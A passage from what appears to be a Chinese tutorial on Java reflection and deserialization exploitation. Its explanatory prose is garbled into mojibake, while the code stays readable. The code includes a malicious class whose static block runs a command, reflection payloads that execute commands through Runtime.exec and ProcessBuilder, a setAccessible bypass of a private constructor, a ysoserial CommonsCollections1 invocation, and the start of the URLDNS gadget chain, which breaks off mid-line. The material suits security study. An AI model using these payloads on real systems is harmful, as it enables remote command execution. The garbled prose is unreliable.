è½½ç±»ï¼Œè¿™ä¸ªç±»åå¿…é¡»æ˜¯å®Œæ•´è·¯å¾„ï¼Œæ¯”å¦‚ä¸Šé¢æåˆ°çš„java.lang.Runtime\nç¬¬äºŒä¸ªå‚æ•°initializeç”¨äºfornameæ—¶çš„åˆå§‹åŒ–ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¼šè®¤ä¸ºåˆå§‹åŒ–å°±æ˜¯åŠ è½½ç±»çš„æ„é€ å‡½æ•°ï¼Œå…¶å®å¹¶ä¸æ˜¯ï¼Œè¿™é‡Œæåˆ°çš„åˆå§‹åŒ–æœ‰ä»¥ä¸‹è¿‡ç¨‹ï¼š\nçœ‹ä¸‹é¢è¿™ä¸ªç±»ï¼š\nclass TrainPrint{    {        System.out.printf(\"Empty block inittial &amp;s\\\\n\", this.getClass());    }    static{        System.out.printf(\"Static initial %s\\\\n\", TrainPrint.class);    }    public TrainPrint(){        System.out.printf(\"Innitial %s\\\\n\", this.getClass());    }}\n\nè¿™ä¸ªç±»ä¸­ä¸€å…±æœ‰ä¸‰ä¸ªä»£ç å— ï¼Œåœ¨è¿›è¡Œåˆå§‹åŒ–æ—¶æŒ‰ç…§ä»¥ä¸‹ä¼˜å…ˆçº§è°ƒç”¨ä»£ç å—\n\nstatic{}\n{}\næ„é€ å‡½æ•°\n\n\nå…¶ä¸­ï¼Œstatic{}å°±æ˜¯åœ¨â€œç±»åˆå§‹åŒ–â€æ—¶è°ƒç”¨çš„ï¼Œè€Œ{}ä¸­çš„ä»£ç ä¼šæ”¾åœ¨æ„é€ å‡½æ•°çš„super()åé¢ï¼Œä½†åœ¨å½“å‰æ„é€ å‡½æ•°å†…å®¹çš„å‰é¢\næ‰€ä»¥forNmaeä¸­çš„initialize=trueå…¶å®å°±æ˜¯å‘Šè¯‰jvmæ˜¯å¦æ‰§è¡Œâ€œç±»åˆå§‹åŒ–â€\né‚£ä¹ˆ å¦‚æœæœ‰ä»¥ä¸‹æ–¹æ³• å…¶ä¸­çš„å‚æ•°nameå¯æ§ï¼š\npublic void ref(String name) throws Exception {\t\tClass.forName(name);}\n\næˆ‘ä»¬å°±å¯ä»¥ç¼–å†™ä¸€ä¸ªæ¶æ„ç±»ï¼Œå°†æ¶æ„ä»£ç æ”¾ç½®åœ¨static{}ä¸­ï¼Œä»è€Œæ‰§è¡Œï¼š\nclass PayLoad{    static{        try{            Runtime rt = Runtime.getRuntime();            String[] commands = {\"touch\", \"/etc/passwd\"};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e){        }    }}\n\nå¦‚ä½•é€šè¿‡åå°„æ‰§è¡Œå‘½ä»¤æˆ‘ä»¬åˆšæ‰æåˆ°ï¼Œå¦‚æœæƒ³æ‹¿åˆ°ä¸€ä¸ªç±»ï¼Œéœ€è¦å…ˆimportæ‰èƒ½ä½¿ç”¨ï¼Œè€Œä½¿ç”¨fornameå°±ä¸éœ€è¦äº†ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨fornameåŠ è½½ä»»æ„ç±»ã€‚\nåœ¨javaä¸­æ˜¯æ”¯æŒå†…éƒ¨ç±»çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬åœ¨æ™®é€šç±» c1ä¸­ç¼–å†™å†…éƒ¨ç±»c2ï¼Œåœ¨ç¼–è¯‘æ—¶ä¼šç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼šc1.classå’Œc1$c2.classï¼Œè¿™ä¸¤ä¸ªç±»ä¹‹é—´å¯ä»¥çœ‹ä½œæ²¡æœ‰å…³è”ï¼Œé€šè¿‡Class.forname(\"c1$c2\")å³å¯åŠ è½½è¿™ä¸ªå†…éƒ¨ç±»ï¼Œå½“fastjsonåœ¨checkAutotypeæ—¶å°±ä¼šå…ˆè®²$æ›¿æ¢æˆ. ä¸Šé¢è¯´åˆ°çš„$çš„ä½œç”¨æ—¶æŸ¥æ‰¾å†…éƒ¨ç±»ã€‚\nå½“æˆ‘ä»¬é€šè¿‡åå°„è·å–åˆ°ä¸€ä¸ªç±»ä¹‹åï¼Œå¯ä»¥ç»§ç»­é€šè¿‡åå°„æ¥è°ƒç”¨å…¶ä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œä¹Ÿå¯ä»¥ç»§ç»­å®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œè°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ç”¨newInstance()\nä¸Šé¢æåˆ°è¿‡newInstanceä¼šå®ä¾‹åŒ–ç±»ï¼Œå¹¶ä¸”è§¦å‘å®ƒçš„æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨ä¸€äº›æƒ…å†µä¸‹newInstanceæ˜¯ä¸èƒ½æˆåŠŸæ‰§è¡Œçš„ï¼Œæ¯”å¦‚\nClass clazz = Class.forName(\"java.lang.Runtime\");clazz.getMethod(\"exec\",String.class).invoke(clazz.newInstance(), \"id\");\n\n\næˆ‘ä»¬åˆ†æä¸Šé¢ä¸¤è¡Œä»£ç ï¼Œé¦–å…ˆé€šè¿‡åå°„å°†java.lang.Runtimeä¸­çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•å­˜åˆ°äº†clazzä¸­ï¼Œç»§ç»­åˆ©ç”¨åå°„æ‹¿åˆ°clazzï¼ˆRuntimeï¼‰ä¸­çš„execæ–¹æ³•ï¼Œæœ€åä½¿ç”¨invokeæ‰§è¡Œè¯¥æ–¹æ³•ï¼Œé—®é¢˜å°±å‡ºåœ¨ä¹invokeçš„å‚æ•°ä¸Šã€‚\næˆ‘ä»¬ä¸Šé¢æåˆ°äº†invokeæ‰§è¡Œæ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¯¥æ–¹æ³•æ‰€åœ¨çš„å¯¹è±¡æˆ–è€…ç±»ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦é€šè¿‡clazz.newInstanceæ¥å®ä¾‹åŒ–clazzï¼Œä½œä¸ºinvokeçš„å‚æ•°ï¼Œä½†clazzçš„æ„é€ å‡½æ•°æ¥è‡ªäºRuntimeï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹Runtimeçš„æ„é€ å‡½æ•°\n\nRuntimeçš„æ„é€ æ–¹æ³•ä¸ºç§æœ‰ï¼Œæ‰€ä»¥åœ¨newInstanceæ—¶æ‰ä¼šæŠ¥é”™ã€‚\nè¿™é‡ŒPç¥çš„javaå®‰å…¨æ¼«è°ˆé‡Œè¯´æ˜äº†ä¸ºä»€ä¹ˆè¦å°†æ„é€ æ–¹æ³•è®¾ä¸ºç§æœ‰ï¼Œè¿™å°±æ˜¯å¾ˆå¸¸è§çš„â€œå•ä¾‹æ¨¡å¼â€ã€‚\næ¯”å¦‚å¯¹äºwebåº”ç”¨æ¥è¯´ï¼Œæ•°æ®åº“åªéœ€è¦å»ºç«‹ä¸€æ¬¡é“¾æ¥ï¼Œè€Œä¸æ˜¯æ¯æ¬¡ç”¨åˆ°æ•°æ®åº“éƒ½è¦å»ºç«‹ä¸€æ¬¡æ–°çš„è¿æ¥ï¼Œä½œä¸ºå¼€å‘è€…å°±å¯ä»¥å°†æ•°æ®åº“è¿æ¥ä½¿ç”¨çš„æ„é€ å‡½æ•°è®¾ä¸ºç§æœ‰ï¼Œç„¶åç¼–å†™ä¸€ä¸ªé™æ€æ–¹æ³•æ¥è·å–ï¼š\npublic class TrainDB() {\tprivate static TrainDB instance = new TrainDB();\tpublic static TrainDB getInstance() {\t\treturn instance;\t}\tprivate TrainDB() {\t// å»ºç«‹è¿æ¥çš„ä»£ç \t}}\n\nåœ¨è¿™ä¸ªç±»åˆå§‹åŒ–æ—¶ï¼Œå°±ä¼šåœ¨ç±»å†…éƒ¨å®ä¾‹åŒ–å‡ºä¸€ä¸ªè¿æ¥æ•°æ®åº“çš„å¯¹è±¡ï¼Œæˆ‘ä»¬åœ¨éœ€è¦æ•°æ®åº“è¿æ¥æ—¶ï¼Œåªéœ€è¦è°ƒç”¨å…¶ä¸­çš„getInstance()æ–¹æ³•è·å–è¿™ä¸ªå¯¹è±¡å³å¯ã€‚\nå›åˆ°å¦‚ä½•æ‰§è¡Œå‘½ä»¤ä¸Šï¼Œå¦‚æœä¸èƒ½é€šè¿‡å®ä¾‹åŒ–è°ƒç”¨æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•ç»§ç»­é€šè¿‡åå°„æ¥è°ƒç”¨æ–¹æ³•ï¼Œæˆ‘ä»¬å°†ä»£ç æ”¹æˆä¸‹é¢è¿™æ ·å°±å¯ä»¥äº†ï¼š\nClass clazz = Class.forname(\"java.lang.Runtime\");clazz.getMethod(\"exec\",String.class).invoke(clazz.getMethod(\"getRuntime\").invoke(clazz),\"calc.exe\");\n\næˆ‘ä»¬åœ¨åˆšå¼€å§‹æ‰§è¡Œå‘½ä»¤æ—¶å°±ç”¨åˆ°äº†Runtimeæ¥è·å–å…¶ä¸­çš„execæ–¹æ³•ï¼Œä¸éš¾çœ‹å‡ºå®ƒå’Œpythonçš„osç±»ä¼¼ï¼Œç»™æˆ‘ä»¬æä¾›äº†ä¸€äº›å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•ï¼Œé‚£ä¹ˆRuntimeåˆ°åº•æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿæ¯å½“æˆ‘ä»¬æ‰§è¡Œä¸€ä¸ªjavaç¨‹åºæ—¶ï¼ŒRuntimeç±»éƒ½ä¼šç”Ÿæˆä¸€ä¸ªå®ä¾‹ï¼Œæ¥å‚¨å­˜å½“å‰è¿è¡Œçš„javaç¨‹åºçš„ç›¸å…³ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡Runtimeç±»ä¸­çš„getRuntime()æ–¹æ³•æ¥è°ƒç”¨å½“å‰javaç¨‹åºçš„è¿è¡Œç¯å¢ƒï¼ˆä¹Ÿå°±æ˜¯ä¸Šé¢æåˆ°çš„å‚¨å­˜ç›¸å…³ä¿¡æ¯çš„å®ä¾‹ï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ—¶è®©jvmçŸ¥é“æˆ‘ä»¬è¦å¯¹å“ªä¸ªjavaç¨‹åºæ‰§è¡Œå‘½ä»¤\næˆ‘ä»¬åˆ†æä»¥ä¸‹ä¸Šé¢æ‰§è¡Œå‘½ä»¤çš„ä¸¤è¡Œä»£ç \n\né€šè¿‡åå°„è·å¾—Runtimeç±»\né€šè¿‡åå°„è·å¾—clazz(Runtime)ä¸­çš„execæ–¹æ³•\ninvoke()è°ƒç”¨execæ–¹æ³•\nè°ƒç”¨getRuntime()å°†å½“å‰javaç¨‹åºè¿è¡Œçš„ç¯å¢ƒä½œä¸ºå‚æ•°ä¼ é€’ç»™invokeï¼Œå¹¶æ‰§è¡Œå‘½ä»¤exec \"calc.exe\"\n\nå¯ä»¥å‘ç°æˆ‘ä»¬åœ¨ç”¨invokeæ‰§è¡ŒRuntimeä¸­çš„å‘½ä»¤æ—¶ï¼Œå¦‚æœä¸èƒ½é€šè¿‡newInstanceæ¥å®ä¾‹åŒ–å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨getRuntime()æ¥è·å–å½“å‰ç¯å¢ƒï¼Œä»è€Œä»£æ›¿invokeçš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚\nä¸Šé¢æ‰§è¡Œå‘½ä»¤çš„ä¸¤è¡Œä»£ç åˆ†è§£å¼€å°±æ˜¯ï¼š\nClass clazz = Class.forname(\"java.lang.Runtime\");Method execMethod = clazz.getMethod(\"exec\", String.class);Method getRuntime = clazz.getMethod(\"getRuntime\")ï¼›Object currentRuntime = getRuntime.invoke(clazz);execMethod.invoke(currentRuntime, \"calc.exe\");\n\nä¸€äº›å…¶ä»–çš„åå°„æœºåˆ¶\næˆ‘ä»¬åˆšæ‰è¯´åˆ°å¯ä»¥é€šè¿‡fornameæ‹¿åˆ°äº†ä¸€ä¸ªç±»ï¼Œå¹¶ä¸”ç»§ç»­åˆ©ç”¨åå°„æˆ–å®ä¾‹åŒ–è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œå¦‚æœä¸€ä¸ªç±»æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•æˆ–è€…ä¹Ÿæ²¡æœ‰ç±»ä¼¼å•ä¾‹æ¨¡å¼é‡Œçš„é™æ€æ–¹æ³•ï¼Œé‚£æˆ‘ä»¬åº”è¯¥æ€æ ·é€šè¿‡åå°„å®ä¾‹åŒ–è¯¥ç±»å‘¢ï¼Ÿ\nå¦‚æœä¸€ä¸ªæ–¹æ³•æˆ–æ„é€ æ–¹æ³•æ˜¯ç§æœ‰æ–¹æ³•ï¼Œæˆ‘ä»¬åº”è¯¥æ€ä¹ˆå»æ‰§è¡Œå®ƒå‘¢ï¼Ÿ\n\nåˆ©ç”¨ProcessBuilderæ‰§è¡Œå‘½ä»¤ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªæ–°çš„åå°„æ–¹æ³•getConstructorã€‚\nå’ŒgetMethodç±»ä¼¼ï¼ŒgetConstructoræ¥æ”¶çš„å‚æ•°æ˜¯æ„é€ å‡½æ•°çš„çš„åˆ—è¡¨ç±»å‹ï¼Œå› ä¸ºæ„é€ å‡½æ•°ä¹Ÿæ”¯æŒé‡è½½ï¼Œæ‰€ä»¥è¦ç”¨å‚æ•°åˆ—è¡¨ç±»å‹æ‰èƒ½å”¯ä¸€ç¡®å®šä¸€ä¸ªæ„é€ å‡½æ•°\næ¯”å¦‚æˆ‘ä»¬å¸¸ç”¨çš„å¦ä¸€ç§æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼ProcessBuilderï¼Œæˆ‘ä»¬ä½¿ç”¨åå°„æ¥è·å–å…¶æ„é€ å‡½æ•°ï¼Œç„¶å è°ƒç”¨start()æ¥æ‰§è¡Œå‘½ä»¤\nProcessBuilder:\nProcessBuilderç”¨äºåˆ›å»ºæ“ä½œç³»ç»Ÿè¿›ç¨‹ï¼Œå®ƒæä¾›ä¸€ç§å¯åŠ¨å’Œç®¡ç†è¿›ç¨‹ï¼ˆä¹Ÿå°±æ˜¯åº”ç”¨ç¨‹åºï¼‰çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å®ä¾‹åŒ–è¿™ä¸ªç±»å¹¶ä¸”é€šè¿‡åå°„è°ƒç”¨å…¶ä¸­çš„startæ–¹æ³•æ¥å¼€å¯ä¸€ä¸ªå­è¿›ç¨‹ ï¼Œæˆ‘ä»¬å¯ä»¥ç†è§£æˆå½“getRuntimeè¢«ç¦ç”¨æ—¶ï¼Œå¯ä»¥ç”¨ProcessBuilderæ¥æ‰§è¡Œå‘½ä»¤ã€‚\nProcessBuilderæœ‰ä¸¤ä¸ªæ„é€ å‡½æ•°ï¼š\n\npublic ProcessBuilder(List&lt;String&gt; command)\npublic ProcessBuilder(String... commang)\n\næˆ‘ä»¬ç”¨ProcessBuilderå†™ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„payloadï¼š\nClass clazz = Class.forName(\"java.lang.ProcessBuilder\");((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(\"calc.exe\"))).start();\n\n\né¦–å…ˆåˆ©ç”¨åå°„è·å–ProcessBuilderç±»ï¼›\nè·å–clazz(ProcessBuilder)å½¢å‚åˆ—è¡¨ä¸ºList&lt;String&gt; commandçš„æ„é€ å‡½æ•°ï¼›\nå°†è·å–åˆ°çš„æ„é€ å‡½æ•°åˆ©ç”¨newInstanceè¿›è¡Œå®ä¾‹åŒ–ï¼Œè°ƒç”¨æ„é€ å‡½æ•°ï¼›\nå¯¹æ„é€ å‡½æ•°ä¼ å…¥çš„å‚æ•°ä¸º calc.exeï¼Œå¹¶ä¸”ç”¨Arrays.asListæ–¹æ³•å°†è¦æ‰§è¡Œçš„å‘½ä»¤è½¬ä¸ºListç±»å‹ï¼›\nè¿”å›Listç±»å‹çš„commandï¼›  \nå°†Listç±»å‹çš„commandå¼ºåˆ¶è½¬æ¢ä¸ºProcessBuilderç±»å‹ï¼Œè¿™æ ·å°±å¯ä»¥è°ƒç”¨ProcessBuilderä¸­çš„startæ–¹æ³•æ‰“å¼€calc.exeè¿›ç¨‹ã€‚ \n\n å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•éœ€è¦ç”¨åˆ°å¼ºè½¬ï¼Œä½†æœ‰æ—¶å€™åœ¨åˆ©ç”¨æ¼æ´æ—¶å¹¶æ²¡æœ‰è¿™ç§è¯­æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ç€åˆ©ç”¨åå°„æ¥å®Œæˆè¿™ä¸€æ­¥ Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); clazz.getMethod(\"start\").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(\"calc.exe\")));\n\nforNameè·å–ç±»ï¼›\nè·å–clazzä¸­çš„startæ–¹æ³•ï¼›\nç”¨invokeæ‰§è¡Œstartæ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹‹å‰è¯´è¿‡ç”¨invokeæ‰§è¡Œæ–¹æ³•æ—¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°è¦æ˜¯è¯¥æ–¹æ³•æ‰€åœ¨ç±»çš„å¯¹è±¡ï¼Œä½†clazzä¸­æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥invokeçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸èƒ½æ˜¯clazz.newInstanceï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬æ¢ä¸ªæ–¹æ³•ï¼Œé€šè¿‡getConstructorè·å–åˆ°ProcessBuilderçš„æ„é€ å‡½æ•°ï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªæ„é€ å‡½æ•°newInstanceï¼Œåœ¨å®ä¾‹åŒ–çš„åŒæ—¶å¯¹æ„é€ æ–¹æ³•ä¼ å…¥å‚æ•°calc.exeï¼Œå› ä¸ºæˆ‘ä»¬åˆšæ‰æåˆ°äº†ProcessBuilderæ˜¯æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°çš„ï¼Œæ‰€ä»¥åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å¿…é¡»è¦ä¼ å…¥å‚æ•°ã€‚ï¼ˆè¿™é‡Œè·å–çš„æ„é€ æ–¹æ³•ä¾ç„¶æ˜¯ä¸Šé¢æåˆ°çš„å½¢å‚åˆ—è¡¨ä¸ºListçš„æ„é€ å‡½æ•°ï¼‰\n\n é‚£ä¹ˆæˆ‘ä»¬å†æ¥çœ‹ProcessBuilderçš„å¦ä¸€ä¸ªæ„é€ æ–¹æ³•ï¼š  æˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªæ„é€ æ–¹æ³•çš„å‚æ•°åˆ—è¡¨ä¸ºString... commandï¼Œè¿™ä¸ªå‚æ•°åˆ—è¡¨çš„æ„æ€å…¶å®å°±æ˜¯å‚æ•°æ•°é‡å¯å˜åˆ—è¡¨ï¼Œå½“æˆ‘ä»¬åœ¨å†™ä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œä¸çŸ¥é“è¦ä¼ å…¥å¤šå°‘å‚æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™æˆType... Argsçš„æ–¹å¼ï¼Œå…¶å®åœ¨åº•å±‚æ¥çœ‹String... commandè¿™æ ·çš„å†™æ³•å°±ç­‰æ•ˆäºString[] commandï¼Œç›¸å½“äºä¼ å…¥äº†ä¸€ä¸ªå­—ç¬¦æ•°ç»„ æ¯”å¦‚æœ‰ä¸€ä¸ªhelloæ–¹æ³•ï¼š public void hello(String...names){}\n å¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªæ•°ç»„æƒ³ä¼ ç»™y1æ–¹æ³•ï¼Œåªéœ€è¦ç›´æ¥ä¼ å°±è¡Œï¼š String[] names = {\"hello\", \"world\"};hello(names)\n æ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³è¦è·å–åˆ°å‚æ•°åˆ—è¡¨ä¸ºString... command çš„è¿™ä¸ªæ„é€ æ–¹æ³•ï¼Œæˆ‘ä»¬åœ¨getConstructoræ—¶è¦ä¼ å…¥çš„å‚æ•°ä¸ºString[].classï¼Œåœ¨è°ƒç”¨newInstanceæ—¶ï¼Œå› ä¸ºè¿™ä¸ªæ„é€ æ–¹æ³•æœ¬èº«æ¥å—çš„å°±æ˜¯ä¸€ä¸ªå¯å˜é•¿æ•°ç»„ï¼Œæˆ‘ä»¬åœ¨ä¼ å…¥æ—¶ä¹Ÿä¼ å…¥äº†ä¸€ä¸ªæ•°ç»„ï¼Œå› æ­¤å åŠ èµ·æ¥æ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œæ‰€ä»¥åˆ©ç”¨è¿™ä¸ªæ„é€ æ–¹æ³•çš„payloadå¦‚ä¸‹ï¼š Class clazz = Class.forName(\"java.lang.ProcessBuilder\");((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[]{{\"calc.exe\"}})).start();\n\nåå°„æ‹¿åˆ°ç±»ï¼›\ngetConstructoræ‹¿åˆ°å‚æ•°åˆ—è¡¨ä¸ºString... commandçš„æ„é€ æ–¹æ³•ï¼›\nnewInstanceè§¦å‘è¯¥æ„é€ æ–¹æ³•ï¼Œå¹¶ä¸”ä¼ å…¥ä¸€ä¸ªäºŒç»´å­—ç¬¦æ•°ç»„ï¼›\nç”±äºè¿”å›çš„commandæ˜¯å­—ç¬¦æ•°ç»„ç±»å‹ï¼Œæ‰€ä»¥å¼ºè½¬ä¸ºProcessBuilderå¹¶ç”¨start()æ–¹æ³•è§¦å‘ï¼›\n\n\n\nå¦‚ä½•é€šè¿‡åå°„æ‰§è¡Œç§æœ‰æ–¹æ³•å†å›åˆ°ç¬¬äºŒä¸ªé—®é¢˜ä¸Šï¼Œå¦‚æœä¸€ä¸ªæ–¹æ³•æˆ–æ„é€ æ–¹æ³•æ˜¯privateï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½æ‰§è¡Œå®ƒå‘¢ï¼Ÿ\nè¿™é‡Œå°±è¦ç”¨åˆ°getDeclaredç³»åˆ—çš„åå°„äº†ï¼Œä¸æ™®é€šçš„getMethodï¼ŒgetConstructoråŒºåˆ«æ˜¯ï¼š\n\ngetMethodç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­æ‰€æœ‰å…¬å…±æ–¹æ³•ï¼ŒåŒ…æ‹¬ä»çˆ¶ç±»ç»§æ‰¿çš„æ–¹æ³•ï¼›\ngetDeclaredMethodç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­â€œå£°æ˜â€çš„æ–¹æ³•ï¼Œæ˜¯å®å†™åœ¨è¿™ä¸ªç±»é‡Œçš„ï¼ŒåŒ…æ‹¬ç§æœ‰çš„æ–¹æ³•ï¼Œä½†ä»çˆ¶ç±»é‡Œç»§æ‰¿æ¥çš„å°±ä¸åŒ…å«äº†\n\nåœ¨ç”¨æ³•ä¸ŠgetDeclaredMethodçš„å…·ä½“ç”¨æ³•ä¸getMethodç±»ä¼¼ï¼ŒgetDeclaredConstructorçš„å…·ä½“ç”¨æ³•å’ŒgetConstructorç±»ä¼¼\nä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡Runtimeçš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡Runtime.getRuntime()æ¥è·å–å¯¹è±¡ï¼Œå…¶å®æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ç”¨getDeclaredConstructoræ¥è·å–è¿™ä¸ªç§æœ‰çš„æ„é€ æ–¹æ³•å®ä¾‹åŒ–å¯¹è±¡ï¼Œè¿›è€Œæ‰§è¡Œå‘½ä»¤ï¼š\nClass clazz = Class.forName(\"java.lang.Runtime\");        Constructor m =clazz.getDeclaredConstructor();        m.setAccessible(true);        clazz.getMethod(\"exec\",String.class).invoke(m.newInstance(), \"calc.exe\");\n\nè¿™é‡Œæˆ‘ä»¬åœ¨è·å–åˆ°ç§æœ‰æ–¹æ³•åï¼Œè¦ç”¨setAccessible()æ–¹æ³•ä½¿è¿™ä¸ªç§æœ‰æ–¹æ³•å¯ä»¥è¢«è®¿é—®ï¼Œå…¶ä»–çš„å°±å’Œä¹‹å‰ä»‹ç»çš„åå°„ä¸€æ ·äº†ï¼Œå¦‚æœä¸ç”¨setAccessible()æ–¹æ³•ä¿®æ”¹ä½œç”¨åŸŸè¿™ä¸ªæ–¹æ³•æ˜¯ä»ç„¶ä¸èƒ½è°ƒç”¨çš„\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nysoserialåœ¨ä¸Šæ‰‹javaååºåˆ—åŒ–çš„ç¬¬ä¸€æ¡é“¾å­ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªé›†æˆäº†javaååºåˆ—åŒ–å„ç§gadget chainsï¼ˆåˆ©ç”¨é“¾ï¼‰çš„å·¥å…·ï¼Œysoserialã€‚\nysoserialä¸‹è½½å¥½åè¿˜éœ€è¦å†å®‰è£…ä¸€äº›å…¶ä»–çš„ä¾èµ–ï¼Œæ•™ç¨‹ç½‘ä¸Šæœ‰å¾ˆå¤šï¼Œæˆ‘å°±ä¸ç»†è¯´äº†ï¼Œæˆ‘ä»¬å…ˆç®€å•äº†è§£ä¸€ä¸‹ysoserialä¸­ä¸€äº›æ¯”è¾ƒé‡è¦çš„ä¸œè¥¿ã€‚\né¦–å…ˆæ˜¯åºåˆ—åŒ–ï¼ˆSerializeï¼‰ï¼š\n\nè¿™ä¸ªåºåˆ—åŒ–æ“ä½œå’Œæˆ‘ä¹‹å‰æåˆ°çš„åŸºæœ¬æ˜¯ä¸€æ ·çš„ï¼Œå°†ä¸€ä¸ªå¯¹è±¡ä»¥å­—èŠ‚æµçš„å½¢å¼è¾“å‡ºå¹¶ä¿å­˜ï¼Œå¹¶è§¦å‘å®ƒçš„writeObjectã€‚\nååºåˆ—åŒ–ï¼ˆUnserialize å†ysoserialä¸­å«Deserializeï¼‰ï¼š\n\nå°†ä¸€ä¸ªå­—èŠ‚æµè¯»å…¥è¿˜åŸä¸ºå¯¹è±¡å¹¶è§¦å‘å®ƒçš„readObjectã€‚\nPayloadrunnerï¼š\n\nå¯ä»¥çœ‹åˆ°åœ¨Payloadrunnerä¸­ï¼Œå…ˆå°†å¯¹è±¡åºåˆ—åŒ–å†ååºåˆ—åŒ–ï¼Œå…¶å®å°±æ˜¯ç”¨æ¥è¿è¡Œæˆ‘ä»¬çš„é“¾ï¼Œå¹¶ç”Ÿæˆç›¸åº”çš„payloadï¼Œå…·ä½“æ‰§è¡Œå‘½ä»¤ï¼ˆç”¨ccé“¾ä¸¾ä¾‹ï¼‰ï¼š\njava -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 \"id\"\n\nå¦‚æœæˆ‘ä»¬ç›´æ¥å†intellijä¸­è¿è¡Œè¿™äº›é“¾ï¼Œä¸ä¼šå‡ºç°payloadï¼Œå¹¶ä¸”è¦æ³¨æ„ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨javaååºåˆ—åŒ–ä¸­å‡ ä¹æˆ‘ä»¬ååºåˆ—åŒ–æ‰§è¡Œå‘½ä»¤çš„ç»“æœæ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨ä¸€äº›æ¯”è¾ƒæ˜æ˜¾çš„å‘½ä»¤è®©æˆ‘ä»¬çŸ¥é“è¿™ä¸ªé“¾å­è¢«æˆåŠŸè§¦å‘äº†ï¼Œåœ¨ysoserialä¸­æˆ‘ä»¬ä¸€èˆ¬ç”¨è®¡ç®—å™¨calc.exeï¼Œä¸€èˆ¬æ¥è¯´ysoserialå®‰è£…å¥½åpayloadé»˜è®¤çš„å‚æ•°æ˜¯calc.exeï¼Œå¦‚æœä¸æ˜¯çš„è¯å°±è¦è‡ªå·±æ‰‹åŠ¨è®¾ç½®é»˜è®¤å‚æ•°äº†ï¼Œå…·ä½“çš„æˆ‘å°±ä¸å¤šè¯´äº†ã€‚\nURLDNSé‚£ä¹ˆæˆ‘ä»¬æ¥ä¸Šæ‰‹javaååºåˆ—åŒ–çš„ç¬¬ä¸€æ¡é“¾å­ï¼ŒURLDNSï¼Œè¿™æ¡é“¾å­çš„åˆ©ç”¨é“¾å¾ˆçŸ­ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ysoserialä¸­çš„ä»£ç ï¼š\npublic class URLDNS implements ObjectPayload&lt;Object&gt; {        public Object getObject(final String url) throws Exception {                //Avoid DNS resolution during payload creation                //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.                URLStreamHandler handler = new SilentURLStreamHandler();                HashMap ht = new HashMap(); // HashMap that will contain the URL                URL u = new URL(null, url, handler); // URL to use as the Key                ht.put(u, url); //The value can be anything that 